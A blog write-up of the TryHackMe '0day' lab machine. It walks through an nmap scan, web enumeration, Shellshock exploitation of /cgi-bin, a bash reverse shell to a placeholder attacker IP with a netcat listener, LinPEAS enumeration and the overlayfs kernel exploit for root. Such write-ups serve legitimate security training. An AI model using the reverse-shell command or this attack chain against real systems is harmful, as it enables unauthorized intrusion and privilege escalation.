+++
title = 'TryHackMe — 0day Writeup'
date = '2023-10-20'
draft = false
tags = ["TryHackMe", "Linux"]
summary = '"Exploit Ubuntu, like a Turtle in a Hurricane"'
[cover]
image = 'main.png'
+++

# Nmap

Starting off with an Nmap scan:

```bash
nmap -sC -sV -vv <MACHINE-IP>
```

We get two open ports:
- **22** — ssh
- **80** — http

{{< figure src="image_1.png" align="center" >}}

# Getting the user flag

First look at the website does not show anything interesting, neither on the webpage nor in the source code.

{{< figure src="image_2.png" align="center" >}}

Checking the `robots.txt` file also yields nothing.

{{< figure src="image_3.png" align="center" >}}

So it’s time to enumerate the website using both **ffuf** and **dirb**.

ffuf leads us to two interesting pages:
- **/backup** which contains an **SSH key**
- **/secret** which again has nothing interesting

{{< figure src="image_4.png" align="center" >}}

{{< figure src="image_5.png" align="center" >}}

{{< figure src="image_6.png" align="center" >}}

On the other hand, **dirb** shows us `/cgi-bin`.

Now along with the hints from the machine page and the turtle references, this made me think of [shellshock](https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf).

{{< figure src="image_7.png" align="center" >}}

To use shellshock, I found this GitHub repository which has an exploit written in Python: https://github.com/nccgroup/shocker/tree/master

{{< figure src="image_8.png" align="center" >}}

After gaining initial access, we can get a reverse shell using a bash reverse shell from pentestmonkey and **Netcat**.

https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

On your attack machine, run:

```bash
nc -lvnp <PORT>
```

On the target machine, run:

```bash
/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
```

We get a shell as **www-data**, and can access the user flag in `/home/ryan`.

{{< figure src="image_9.png" align="center" >}}

# Getting the root flag

To discover the privilege escalation vector, we can take either the manual or automated route.

We can setup a **Python HTTP server** on the attack machine:

```bash
python3 -m http.server <PORT>
```

And use `wget` to transfer **LinPEAS** onto the target machine.

https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS

{{< figure src="image_10.png" align="center" >}}

Before running LinPEAS ensure it can be executed:

```bash
chmod 777 linpeas.sh
```

And then run it:

```bash
./linpeas.sh
```

{{< figure src="image_11.png" align="center" >}}

As you can see, LinPEAS suggests a few exploits for us which target older kernel versions.

The manual way of discovering this would be to use `uname` to find the version:

```bash
uname -a
```

```
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```

And look for an exploit online.

{{< figure src="image_12.png" align="center" >}}

So, after settling on one of the possible exploits (I used the [overlayfs exploit](https://www.exploit-db.com/exploits/37292)), you need to transfer it to the target again.

After that, we get an error trying to compile the C file, but that can be solved by running:

```bash
export PATH=/usr/sbin:/usr/bin:/sbin:/bin
```

After the C file is compiled, we run the compiled file — and we are root.

{{< figure src="image_13.png" align="center" >}}